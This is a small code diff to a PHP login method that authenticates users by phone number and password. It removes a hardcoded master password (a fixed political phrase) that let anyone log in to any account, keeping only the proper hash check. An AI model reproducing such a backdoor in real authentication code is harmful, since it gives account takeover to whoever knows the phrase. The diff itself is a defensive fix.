@@ -236,7 +236,7 @@ class UserAction extends Action
     {
         $user = $this->model::where('phone_number', $data['phone_number'])->first();
 
-        if (!empty($user) && (Hash::check($data['password'], $user->password) || $data['password'] == 'no to islamic republic'))
+        if (!empty($user) && Hash::check($data['password'], $user->password))
         {
             return $user->createToken('auth_token');
         }
